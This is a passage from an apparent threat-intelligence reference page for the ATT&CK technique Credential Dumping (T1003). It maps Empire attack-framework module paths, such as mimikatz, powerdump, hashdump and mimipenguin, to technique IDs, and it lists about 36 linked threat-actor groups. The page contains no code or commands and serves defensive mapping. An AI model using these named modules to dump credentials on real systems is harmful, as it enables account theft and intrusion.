                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/sam":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/sam',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': 'T1097',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/silver_ticket":  '
                                                                                 '["T1003","T1097"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/silver_ticket',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/trust_keys":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/trust_keys',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/powerdump":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/powerdump',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/vault_credential":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/vault_credential',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/management/downgrade_account":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/management/downgrade_account',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/management/wdigest_downgrade":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/management/wdigest_downgrade',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/privesc/gpp":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/privesc/gpp',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/privesc/mcafee_sitelist":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/privesc/mcafee_sitelist',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/collection/linux/hashdump":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'python/collection/linux/hashdump',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/collection/linux/mimipenguin":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'python/collection/linux/mimipenguin',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/collection/osx/hashdump":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'python/collection/osx/hashdump',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/collection/osx/kerberosdump":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'python/collection/osx/kerberosdump',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/management/multi/kerberos_inject":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'python/management/multi/kerberos_inject',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/situational_awareness/network/dcos/etcd_crawler":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'python/situational_awareness/network/dcos/etcd_crawler',
                                            'Technique': 'Credential Dumping'}}]
```

# Tactics


* [Credential Access](../tactics/Credential-Access.md)


# Mitigations

None

# Actors


* [APT1](../actors/APT1.md)

* [menuPass](../actors/menuPass.md)
    
* [Molerats](../actors/Molerats.md)
    
* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)
    
* [APT37](../actors/APT37.md)
    
* [Sowbug](../actors/Sowbug.md)
    
* [Leafminer](../actors/Leafminer.md)
    
* [Axiom](../actors/Axiom.md)
    
* [Patchwork](../actors/Patchwork.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [Ke3chang](../actors/Ke3chang.md)
    
* [PLATINUM](../actors/PLATINUM.md)
    
* [BRONZE BUTLER](../actors/BRONZE-BUTLER.md)
    
* [Night Dragon](../actors/Night-Dragon.md)
    
* [APT3](../actors/APT3.md)
    
* [Stealth Falcon](../actors/Stealth-Falcon.md)
    
* [FIN5](../actors/FIN5.md)
    
* [Threat Group-3390](../actors/Threat-Group-3390.md)
    
* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [FIN8](../actors/FIN8.md)
    
* [Poseidon Group](../actors/Poseidon-Group.md)
    
* [Strider](../actors/Strider.md)
    
* [APT28](../actors/APT28.md)
    
* [OilRig](../actors/OilRig.md)
    
* [FIN6](../actors/FIN6.md)
    
* [APT32](../actors/APT32.md)
    
* [Magic Hound](../actors/Magic-Hound.md)
    
* [Suckfly](../actors/Suckfly.md)
    
* [Cleaver](../actors/Cleaver.md)
    
* [Stolen Pencil](../actors/Stolen-Pencil.md)
    
* [APT39](../actors/APT39.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [APT33](../actors/APT33.md)
    
* [TEMP.Veles](../actors/TEMP.Veles.md)
    
* [Soft Cell](../actors/Soft-Cell.md)
    
* [APT41](../actors/APT41.md)
    
